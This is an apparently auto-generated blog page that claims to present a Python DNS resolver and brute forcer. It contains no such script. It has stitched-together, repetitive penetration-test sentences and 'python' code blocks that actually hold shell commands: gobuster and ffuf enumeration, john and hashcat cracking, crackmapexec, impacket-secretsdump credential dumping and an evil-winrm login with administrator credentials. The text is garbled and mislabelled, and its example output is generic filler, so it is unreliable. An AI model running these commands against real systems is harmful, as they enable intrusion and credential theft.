---
TitleSEO: "DNS Resolver and Brute Forcer in Python | ZureFX"
TitlePost: "DNS Resolver and Brute Forcer — Python"
Author: "ZureFX"
Description: "A Python script for dns resolver and brute forcer. Built for security research and automation."
Keywords: "python, powershell, rust"
URL: "https://zurefx.github.io/scripting/script-dns-resolver-and-brute-forcer-517.html"
URL_IMAGES: ""
Date: "2026-01-07"
Tags: "Python, PowerShell, Rust"
Section: "scripting"
Lang: "en"
main_img: "script-dns-resolver-and-brute-forcer-517"
Permalink: "/scripting/script-dns-resolver-and-brute-forcer-517.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Initial enumeration revealed several interesting open ports on the target. The web application was vulnerable to Server-Side Template Injection (SSTI). Lateral movement was facilitated by reusing discovered credentials across services.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `rpcclient`
- `lookupsid`
- `evil-winrm`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

```python
gobuster dir -u http://10.103.112.77/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Token impersonation allowed elevation to SYSTEM privileges on the target. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code.

```python
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

## Usage

### Basic Usage

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
crackmapexec smb 10.52.193.178 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.11.165.204/FUZZ
```

### Advanced Options

The application stored sensitive credentials in an unencrypted configuration file. Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.93.218.191
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
evil-winrm -i 10.24.34.38 -u administrator -p 'P@ssw0rd!'
```

## Output

### Example Output

The application stored sensitive credentials in an unencrypted configuration file. The application stored sensitive credentials in an unencrypted configuration file.

```
[+] Scanning target...
[+] Found 13 results
[+] Done in 15.89s
```
